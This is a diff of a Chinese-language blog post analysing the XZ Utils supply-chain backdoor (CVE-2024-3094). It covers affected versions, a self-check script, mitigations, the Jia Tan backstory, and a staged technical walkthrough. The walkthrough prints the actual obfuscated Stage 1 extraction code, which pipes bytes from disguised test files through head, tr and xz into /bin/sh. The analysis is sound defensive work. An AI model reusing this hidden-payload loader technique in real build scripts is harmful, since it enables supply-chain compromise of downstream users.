@@ -10,7 +10,7 @@
 <meta name="description" content="Xavier&#39;s Blog" /><meta name="keywords" content='漏洞分析' /><meta itemprop="name" content="XZ Utils Backdoor 事件分析汇总">
 <meta itemprop="description" content=""><meta itemprop="datePublished" content="2024-04-06T17:05:44+00:00" />
 <meta itemprop="dateModified" content="2024-04-06T17:05:44+00:00" />
-<meta itemprop="wordCount" content="11067">
+<meta itemprop="wordCount" content="10197">
 <meta itemprop="keywords" content="漏洞分析," /><meta property="og:title" content="XZ Utils Backdoor 事件分析汇总" />
 <meta property="og:description" content="" />
 <meta property="og:type" content="article" />
@@ -32,7 +32,7 @@
     "mainEntityOfPage": {
       "@type": "WebPage",
       "@id": "https:\/\/www.bthoughts.top\/posts\/xz-backdoor-analysis\/"
-    },"genre": "posts","keywords": "漏洞分析","wordcount":  11067 ,
+    },"genre": "posts","keywords": "漏洞分析","wordcount":  10197 ,
     "url": "https:\/\/www.bthoughts.top\/posts\/xz-backdoor-analysis\/","datePublished": "2024-04-06T17:05:44+00:00","dateModified": "2024-04-06T17:05:44+00:00","publisher": {
       "@type": "Organization",
       "name": ""},"author": {
@@ -189,7 +189,7 @@
       </h1></div><div class="post-meta">
       <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.jpeg" srcset="/resource/friends/me.jpeg, /resource/friends/me.jpeg 1.5x, /resource/friends/me.jpeg 2x" sizes="auto" data-title="Xavier" data-alt="Xavier" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>&nbsp;Xavier</span></span>
           <span class="post-category">收录于 <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 漏洞分析</a>&ensp;<a href="/categories/%E8%81%8C%E4%B8%9A%E7%94%9F%E6%B6%AF/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 职业生涯</a></span></div>
-      <div class="post-meta-line"><span title=2024-04-06&#32;17:05:44><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-04-06">2024-04-06</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 11067 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 23 分钟</span>&nbsp;</div>
+      <div class="post-meta-line"><span title=2024-04-06&#32;17:05:44><i class="fa-regular fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-04-06">2024-04-06</time></span>&nbsp;<span><i class="fa-solid fa-pencil-alt fa-fw" aria-hidden="true"></i> 约 10197 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw" aria-hidden="true"></i> 预计阅读 21 分钟</span>&nbsp;</div>
     </div><div class="details toc" id="toc-static" data-kept="false">
         <div class="details-summary toc-title">
           <span>目录</span>
@@ -201,7 +201,7 @@
     <li><a href="#漏洞介绍">漏洞介绍</a>
       <ul>
         <li><a href="#漏洞信息">漏洞信息</a></li>
-        <li><a href="#受影响组件和系统">受影响组件和系统：</a></li>
+        <li><a href="#受影响组件和系统">受影响组件和系统</a></li>
         <li><a href="#漏洞排查">漏洞排查</a></li>
         <li><a href="#缓解措施">缓解措施</a></li>
       </ul>
@@ -214,11 +214,9 @@
         <li><a href="#stage-2">Stage 2</a></li>
         <li><a href="#o二进制分析">.o二进制分析</a></li>
         <li><a href="#后门设计分析">后门设计分析</a></li>
-        <li><a href="#后门设计细节">后门设计细节</a></li>
-        <li><a href="#payload-有效载荷">payload 有效载荷</a></li>
+        <li><a href="#payload-分析">payload 分析</a></li>
         <li><a href="#xz-bits">xz bits</a></li>
         <li><a href="#人员分析">人员分析</a></li>
-        <li><a href="#payload分析">payload分析</a></li>
       </ul>
     </li>
     <li><a href="#漏洞利用">漏洞利用</a></li>
@@ -232,17 +230,55 @@
 <p>XZ Utils是一个命令行工具，包含XZ文件和liblzma的压缩和解压缩功能。 liblzma 是一个用于处理 XZ 压缩格式的开源软件库，是一种用于数据压缩的类似zlib的API，并且还支持旧版 .lzma 格式。</p>
 <p>3月29日，有开发人员在安全邮件列表上发帖称，他在调查SSH性能问题时发现了涉及XZ包中的供应链攻击，进一步溯源发现SSH使用的上游liblzma库被植入了后门代码，恶意代码可能允许攻击者通过后门版本的SSH非授权获取系统的访问权限。恶意代码修改了liblzma代码中的函数，该代码是XZ Utils软件包的一部分，链接到 XZ 库的任何软件都可以使用此修改后的代码，并允许拦截和修改与该库一起使用的数据。</p>
 <h3 id="漏洞信息">漏洞信息</h3>
-<p>漏洞名称：XZ Utilѕ工具库恶意后门植入漏洞
-公开时间：2024-03-29
-CVE编号：CVE-2024-3094
-漏洞评级：高危
-事件类型：供应链攻击、 后门
-技术类型： 内嵌恶意代码
-厂商： 开源项目 Tukaani Project
-产品： xz
-威胁状态：POC/EXP未公开，在野利用已发现，技术细节部分公开
-影响版本： xz == 5.6.0 、xz == 5.6.1 、liblzma== 5.6.0 、liblzma== 5.6.1</p>
-<h3 id="受影响组件和系统">受影响组件和系统：</h3>
+<table>
+<thead>
+<tr>
+<th>&mdash;&mdash;</th>
+<th>&mdash;&mdash;</th>
+<th>&mdash;&mdash;</th>
+<th>&mdash;&mdash;</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>漏洞名称</strong></td>
+<td>XZ Utilѕ工具库恶意后门植入漏洞</td>
+<td><strong>公开时间</strong></td>
+<td>2024-03-29</td>
+</tr>
+<tr>
+<td><strong>CVE编号</strong></td>
+<td>CVE-2024-3094</td>
+<td><strong>漏洞评级</strong></td>
+<td>高危</td>
+</tr>
+<tr>
+<td><strong>事件类型</strong></td>
+<td>供应链攻击、 后门</td>
+<td><strong>技术类型</strong></td>
+<td>内嵌恶意代码</td>
+</tr>
+<tr>
+<td><strong>厂商</strong></td>
+<td>开源项目 Tukaani Project</td>
+<td><strong>产品</strong></td>
+<td>xz</td>
+</tr>
+<tr>
+<td><strong>威胁状态</strong></td>
+<td>POC/EXP已公开，在野利用已发现，技术细节部分公开</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>影响版本</strong></td>
+<td>xz == 5.6.0 、xz == 5.6.1 、liblzma== 5.6.0 、liblzma== 5.6.1</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h3 id="受影响组件和系统">受影响组件和系统</h3>
 <p>xz 和 liblzma 5.6.0~5.6.1 版本，可能包括的发行版 / 包管理系统有：</p>
 <ul>
 <li>Fedora 41 / Fedora Rawhide</li>
@@ -261,7 +297,7 @@ CVE编号：CVE-2024-3094
 <p>通过如下命令查看系统本地是否安装了受影响的 XZ：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ xz --version
 </span></span><span class="line"><span class="cl">xz <span class="o">(</span>XZ Utils<span class="o">)</span> 5.6.1
-</span></span><span class="line"><span class="cl">iblzma 5.6.1
+</span></span><span class="line"><span class="cl">liblzma 5.6.1
 </span></span></code></pre></div><p>自查脚本如下：</p>
 <p>在系统中执行脚本</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#! /bin/bash
@@ -283,43 +319,57 @@ CVE编号：CVE-2024-3094
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span> probably not vulnerable
 </span></span><span class="line"><span class="cl"><span class="k">fi</span>
 </span></span></code></pre></div><h3 id="缓解措施">缓解措施</h3>
-<p>目前官方尚无最新版本， 需对软件版本进行降级 5.4.X， 请关注官方新版本发布并及时更新。
-Fedora Linux 40 用户需 xz 回退到 5.4.x 版本可参考：</p>
+<p>目前官方尚无最新版本， 需对软件版本进行降级 5.4.X， 请关注官方新版本发布并及时更新。</p>
+<p>Fedora Linux 40 用户需 xz 回退到 5.4.x 版本可参考：</p>
 <p><a href="https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users"target="_blank" rel="external nofollow noopener noreferrer">https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users</a></p>
 <p><a href="https://bodhi.fedoraproject.org/updates/FEDORA-2024-d02c7bb266"target="_blank" rel="external nofollow noopener noreferrer">https://bodhi.fedoraproject.org/updates/FEDORA-2024-d02c7bb266</a></p>
 <h2 id="背后故事">背后故事</h2>
 <p>故事大概是：</p>
 <p>OpenSSH依赖一个名为liblzma(xz)的小众开源压缩库，攻击者虚构了一个名为&quot;Jia Tan&quot;的开发者身份，从2021年10月开始为xz项目积极做开发维护贡献，逐渐获得信任。</p>
-<p>并最终接管了维护工作后，在构建脚本中逐步加入一个复杂隐蔽并复杂混淆的后门，而且是几个月内慢慢的添加所有组件，组合成了完整的后门，接着还联系Linux发行版维护人员，试图让带后门的xz库被打包分发给所有用户，直到微软员工Andres Freund因调查SSH延迟问题发现了此事。</p>
-<p>发现也很巧合，Andres Freund在分析一台运行Debian Sid的Linux设备SSH登录速度过慢问题时（有500毫秒的延迟和大量的CPU消耗问题，而且他在使用“Valgrind”工具进行分析和内存调试时遇到了许多报错，也促使他有进一步调查的想法），最终发现了该后门。而且RCE也非常聪明，将有效负载隐藏到将要发送到 SSH 的专门制作的密钥里。</p>
+<p>最终接管了维护工作后，在构建脚本中逐步加入一个复杂隐蔽并复杂混淆的后门，而且是几个月内慢慢的添加所有组件，组合成了完整的后门，接着还联系Linux发行版维护人员，试图让带后门的xz库被打包分发给所有用户，直到微软员工Andres Freund因调查SSH延迟问题发现了此事。</p>
+<p>发现也很巧合，Andres Freund在分析一台运行Debian Sid的Linux设备SSH登录速度过慢问题时（有500毫秒的延迟和大量的CPU消耗问题，而且他在使用“Valgrind”工具进行分析和内存调试时遇到了许多报错，也促使他有进一步调查的想法），最终发现了该后门。而且RCE也非常巧妙，将有效负载隐藏到将要发送到 SSH 的专门制作的密钥里。</p>
 <p><img loading="lazy" src="resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/640.png" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/640.png, resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/640.png 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/640.png 2x" sizes="auto" data-title="img" data-alt="img" width="1080" height="707" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>目前迹象表明，后门作者有选择性的针对 linux 发行版下手。但这个 liblzma 可不只Linux上用。比如目前流行的iOS越狱环境，大部分 tweak 包还是以 .deb 格式发行，比较新的版本就用到了 lzma 作为压缩。</p>
-<p>除此之外近期有在 macOS 上使用 brew 安装过 xz 这个包应该也受影响，暂时不能证明有恶意行为：
-要命的是很多 brew 包都依赖了 xz，你可能不知不觉就装上了，还好目前没有证据表明这个后门会感染 macOS。</p>
-<p>Andres 的电子邮件里有对整个故事精彩描述。还有有趣的部分是带有混淆后门的二进制文件本身，邮件原文在这：https://www.openwall.com/lists/oss-security/2024/03/29/4</p>
+<p>除此之外近期有在 macOS 上使用 brew 安装过 xz 这个包应该也受影响，很多 brew 包都依赖了 xz，你可能不知不觉就装上了，还好暂时不能证明这个后门会感染 macOS。</p>
+<p>Andres 的电子邮件里有对整个故事精彩描述。还有有趣的部分是带有混淆后门的二进制文件本身，<a href="https://www.openwall.com/lists/oss-security/2024/03/29/4"target="_blank" rel="external nofollow noopener noreferrer">邮件原文在这</a>。</p>
 <p><img loading="lazy" src="resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/image-20240405174100383.png" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240405174100383.png, resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/image-20240405174100383.png 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240405174100383.png 2x" sizes="auto" data-title="image-20240405174100383" data-alt="image-20240405174100383" width="867" height="635" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>从5.6.0版本开始，在xz的上游tarball包中发现了恶意代码。通过一系列复杂的混淆手段，liblzma的构建过程从伪装成测试文件的源代码中提取出预构建的目标文件，然后用它来修改liblzma代码中的特定函数。这导致生成了一个被修改过的liblzma库，任何链接此库的软件都可能使用它，从而拦截并修改与此库的数据交互。</p>
 <p>xz 5.6.0和5.6.1版本库中存在的恶意注入只包含在tarball下载包中。Git发行版中缺少触发恶意代码构建的M4宏。注入期间构建时使用的第二阶段工件存在于Git存储库中，以防存在恶意的M4宏。如果不合并到构建中，第二阶段文件是无害的。</p>
 <p>在发现者的演示中，发现它干扰了OpenSSH守护进程。虽然OpenSSH没有直接链接到liblzma库，但它以一种使其暴露于恶意软件的方式与systemd通信，因为systemd链接到了liblzma。</p>
 <p>恶意构建会通过systemd干扰sshd的认证。SSH是一种常用的协议，用于远程连接系统，而sshd是允许访问的服务。在适当的情况下，这种干扰有可能使恶意行为体破坏sshd认证，并远程未经授权访问整个系统。</p>
 <p>整个后门故事非常精彩，攻击者为此整整潜伏了三年，只差一点点就可以往众多 Linux发行版的 sshd 注入后门，可用于绕过密钥验证，后果不堪设想。</p>
-<p>省流概括:
-1.攻击者 JiaT75 (Jia Tan) 于2021年注册了 GitHub 账号，之后积极参与xz项目的维护，并逐渐获取信任，于2022年成为了xz的定期贡献者，获得了直接 commit 代码的权利。2023年1月7日JiaT75合并了他们的第一次提交。2024年项目URL变更为http://xz.tukaani.org/xz-utils/，进一步增加了JiaT75对该项目的控制。</p>
-<p>2.JiaT75 在最近几个月的一次 commit 中，悄悄加入了 bad-3-corrupt lzma2.xz和good-large compressed.lzma 两个看起来人畜无害的测试用二进制数据，然而在编译脚本中，在特定条件下会从这两个文件中读取内容对编译结果进行修改，致使编译结果和公开的源代码不一致。</p>
-<p>3.目前初步的研究显示，注入的代码会使用glibc的IFUNC 去 HookOpensSH的 RSA public decrypt 函数，致使攻击者可以通过构造特定的验证数据绕过 RSA 签名验证。(具体细节还在分析中)</p>
-<p>4.只要是同时使用了 liblzma和 OpenSsH的程序就会受到影响，最直接的目标就是 sshd，使得攻击者可以构造特定请求，绕过密钥验证远程访问。</p>
-<p>5.受影响的 xz-utils 包已经被并入 Debian testing 中进行测试，攻击者同时也在尝试并入 fedora 和 ubuntu。</p>
-<p>6.幸运的是，注入的代码似乎存在某种 Bug，导致特定情况下 sshd 的 CPU占用飙升。被安全研究人员AndresFrund注意到了，并报告给 oss-security，致使此事败漏。如果不是因为这个 Bug，那么这么后门有不低的概率被并入主流发行版的stable 版本，恐怕会是一件前所未有的重大安全事件。</p>
+<p><strong>省流概括</strong>:</p>
+<ol>
+<li>
+<p>攻击者 JiaT75 (Jia Tan) 于2021年注册了 GitHub 账号，之后积极参与xz项目的维护，并逐渐获取信任，于2022年成为了xz的定期贡献者，获得了直接 commit 代码的权利。2023年1月7日JiaT75合并了他们的第一次提交。2024年项目URL变更为http://xz.tukaani.org/xz-utils/，进一步增加了JiaT75对该项目的控制。</p>
+</li>
+<li>
+<p>JiaT75 在最近几个月的一次 commit 中，悄悄加入了 bad-3-corrupt lzma2.xz 和 good-large compressed.lzma 两个看似无害的测试用二进制数据，然而在编译脚本中，在特定条件下会从这两个文件中读取内容对编译结果进行修改，致使编译结果和公开的源代码不一致。</p>
+</li>
+<li>
+<p>目前初步的研究显示，注入的代码会使用 glibc 的 IFUNC 去 HookOpensSH的 RSA public decrypt 函数，致使攻击者可以通过构造特定的验证数据绕过 RSA 签名验证。(具体细节还在分析中)</p>
+</li>
+<li>
+<p>只要是同时使用了 liblzma和 OpenSsH的程序就会受到影响，最直接的目标就是 sshd，使得攻击者可以构造特定请求，绕过密钥验证远程访问。</p>
+</li>
+<li>
+<p>受影响的 xz-utils 包已经被并入 Debian testing 中进行测试，攻击者同时也在尝试并入 fedora 和 ubuntu。</p>
+</li>
+<li>
+<p>幸运的是，注入的代码似乎存在某种 Bug，导致特定情况下 sshd 的 CPU占用飙升。被安全研究人员AndresFrund注意到了，并报告给 oss-security，致使此事败漏。如果不是因为这个 Bug，那么该后门很有可能被并入主流发行版的stable 版本，那么将形成一场前所未有的重大安全事件。</p>
+</li>
+</ol>
 <p>另外从一些细节能看出来攻击者非常用心:</p>
 <p>攻击者抢在 ubuntu beta freeze 的几天前才尝试让新版本并入，以期望减少在测试期间被发现的时间。</p>
 <p>xz-utils 项目的原维护者 Lasse Colin(Larhzu)，有着定期进行internetbreaks的习惯，而且最近正在进行，导致这些变动他并没有review的机会，即使到现在也没能联系上他本人。这可能也是攻击者选定xz-utils 项目的原因之一。</p>
 <p>更多的细节还在被分析中，目前 GitHub 已经关停了整个 xz项目。</p>
 <h2 id="技术细节">技术细节</h2>
-<p>很值得我关注的部分一是整个新式攻击手法模型，二是混淆手段和思路，还有就带有后门的混淆二进制文件本身了。这后门是给了一个CVE的，编号是CVE-2024-3094，受影响的xz/liblzma 有两个版本：5.6.0 和 5.6.1。</p>
+<p>很值得关注的部分一是整个新式攻击手法模型，二是混淆手段和思路，还有就带有后门的混淆二进制文件本身了。</p>
 <p>Andres Freund 邮件原文有后门程序的详细分析，但由于发现者不是安全研究人员，也不擅长逆向，所以都是以观察分析类发现为主。</p>
 <p>推上@Thomas Roccia也制作了分析图：</p>
 <p><img loading="lazy" src="resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/b5157017fbcebb8d.png" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/b5157017fbcebb8d.png, resource/xz%e5%ba%93%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e4%ba%8b%e4%bb%b6.assets/b5157017fbcebb8d.png 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/b5157017fbcebb8d.png 2x" sizes="auto" data-title="img" data-alt="img" width="1217" height="1704" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/></p>
 <p>详细展开下上述内容，将Stage 1 前的部分，暂时称为 Stage 0。</p>
+<p>目前 GitHub 已经关停了整个 xz项目，但可以从 <a href="https://github.com/thesamesam/xz-archive"target="_blank" rel="external nofollow noopener noreferrer">备份仓库</a> 进行下载分析。</p>
 <h3 id="stage-0">Stage 0</h3>
 <p>从<a href="https://salsa.debian.org/debian/xz-utils/-/blob/46cb28adbbfb8f50a10704c1b86f107d077878e6/m4/build-to-host.m4"target="_blank" rel="external nofollow noopener noreferrer">m4/build-to-host.m4</a>文件开始。以下是相关代码片段：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">...
@@ -331,8 +381,8 @@ Fedora Linux 40 用户需 xz 回退到 5.4.x 版本可参考：</p>
 <p>进行了一个字符替换，将制表符<code>\t</code>、空格<code>\ </code>、连字符<code>-</code>、下划线<code>_</code>，依次替换为了空格<code>\ </code>、制表符<code>\t</code>、下划线<code>_</code>、连字符<code>-</code></p>
 <p>这段代码在构建过程中的某个地方运行，提取第一阶段脚本。概述如下：</p>
 <ol>
-<li>从文件中读取来自<code>tests/files/bad-3-corrupt_lzma2.xz</code>的字节，并将其输出到下一步的标准输出/输入。读取完所有内容后，会添加换行符<code>\n</code></li>
-<li>第二步是运行 tr 命令，将选定的字符更改为其他字符，将制表符<code>\t</code>、空格<code>\ </code>、连字符<code>-</code>、下划线<code>_</code>，依次替换为了空格<code>\ </code>、制表符<code>\t</code>、下划线<code>_</code>、连字符<code>-</code>，它对从<code>tests/files/bad-3-corrupt_lzma2.xz</code> 文件流式传输的字节进行替换，这使得 bad-3-corrupt_lzma2.xz 再次形成了正确的 xz 流。</li>
+<li><code>sed \&quot;r\n\&quot; $gl_am_configmake</code>：读取 <code>tests/files/bad-3-corrupt_lzma2.xz </code>文件中的字节，并用作下一步的输入。读取完所有内容后，会添加换行符<code>\n</code>;</li>
+<li>运行 tr 命令，进行字符替换，将选定的字符更改为其他字符，将制表符<code>\t</code>、空格<code>\ </code>、连字符<code>-</code>、下划线<code>_</code>，依次替换为了空格<code>\ </code>、制表符<code>\t</code>、下划线<code>_</code>、连字符<code>-</code>，它对<code>tests/files/bad-3-corrupt_lzma2.xz</code> 文件中的字节进行替换，这使得 bad-3-corrupt_lzma2.xz 再次形成了正确的 xz 流。</li>
 <li>在此阶段的最后一步中，提取固定的 xz 字节流，并忽略错误（该流似乎被截断，但这并不重要，因为整个有意义的输出已被写出）。其结果是Stage 1的脚本，该脚本会立即执行。</li>
 </ol>
 <p>下面是 5.6.0 版本解压后的Stage 1 脚本</p>
@@ -353,25 +403,25 @@ Fedora Linux 40 用户需 xz 回退到 5.4.x 版本可参考：</p>
 </span></span><span class="line"><span class="cl"><span class="k">fi</span>
 </span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">i</span><span class="o">=</span><span class="s2">&#34;((head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +939)&#34;</span><span class="p">;</span><span class="o">(</span>xz -dc <span class="nv">$srcdir</span>/tests/files/good-large_compressed.lzma<span class="p">|</span><span class="nb">eval</span> <span class="nv">$i</span><span class="p">|</span>tail -c +31233<span class="p">|</span>tr <span class="s2">&#34;\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113&#34;</span> <span class="s2">&#34;\0-\377&#34;</span><span class="o">)</span><span class="p">|</span>xz -F raw --lzma1 -dc<span class="p">|</span>/bin/sh
 </span></span><span class="line"><span class="cl"><span class="c1">####World####</span>
-</span></span></code></pre></div><p>5.6.0 和 5.6.1 的一些区别：</p>
+</span></span></code></pre></div><p>可以看到5.6.0 和 5.6.1 的一些区别：</p>
 <p>第一个区别是第二行注释中的随机字节。在5.6.0 是 86 F9 5A F7 2E 68 6A BC, 而在 5.6.1 是 E5 55 89 B7 24 04 D8 17. 暂时不确定这些差异是否有意义。</p>
-<p>检查脚本是否在 Linux 上运行是在 5.6.1 中添加的，事实上它重复了 5 次，这很奇怪</p>
-<p>现在让我们切换到第 2 阶段提取代码，即带有很多head的<code>export i=... </code>行。进行简单拆分</p>
+<p>第二个区别是5.6.1版本添加了检测是否在 Linux 上运行代码，而它重复了 5 次，这很奇怪。</p>
+<p>先分析第 2 阶段提取代码，即带有很多head的<code>export i=... </code>行。进行简单拆分：</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">i</span><span class="o">=</span><span class="s2">&#34;((head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +2048 &amp;&amp; (head -c +1024 &gt;/dev/null) &amp;&amp; head -c +939)&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">(</span>xz -dc <span class="nv">$srcdir</span>/tests/files/good-large_compressed.lzma<span class="p">|</span><span class="nb">eval</span> <span class="nv">$i</span><span class="p">|</span>tail -c +31233<span class="p">|</span>tr <span class="s2">&#34;\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113&#34;</span> <span class="s2">&#34;\0-\377&#34;</span><span class="o">)</span><span class="p">|</span>xz -F raw --lzma1 -dc<span class="p">|</span>/bin/sh
 </span></span></code></pre></div><ol>
 <li>
-<p>开头的<code>export i=... </code>基本上只是一个函数“定义”。它在第 3 步（以及第 2 步）中被调用</p>
+<p>开头的<code>export i=... </code> 只是一个函数定义。它会在Stage 2 和 Stage 3 中被调用。</p>
 </li>
 <li>
-<p>第 2 步是将 <code>good-large_compressed.lzma</code> 文件解压缩到标准输出 (xz -dc) 。与之前一样，这会启动一个步骤的一系列输出，并用作下一步的输入</p>
+<p>第 2 步是将 <code>good-large_compressed.lzma</code> 文件解压缩到标准输出 (xz -dc) ，并用作下一步的输入；</p>
 </li>
 <li>
-<p>现在我们进行 i 函数调用 (eval $i)。该函数基本上是一系列head调用，要么输出接下来的 N 个字节，要么跳过接下来的 N 个字节。i 函数最终实现忽略 1024 个字节，再输出 2048 个字节，忽略 1024 个字节，再输出 2048 个字节&hellip;依此类推，直到我们到达文件的最末尾，其中只有 724 个字节（在 5.6.0 中）或 939输出字节（在 5.6.1 中）。</p>
+<p>然后会调用 i 函数 (<code>eval $i</code>)。该函数基本上是一系列head调用，要么输出接下来的 N 个字节（<code>head -c +N</code>），要么跳过接下来的 N 个字节（<code>head -c +N &gt;/dev/null</code>）。i 函数最终实现：忽略 1024 个字节，再输出 2048 个字节，忽略 1024 个字节，再输出 2048 个字节&hellip;依此类推，直到到达文件的最末尾，其中只有 724 个字节（在 5.6.0 中）或 939输出字节（在 5.6.1 中）。</p>
 </li>
 <li>
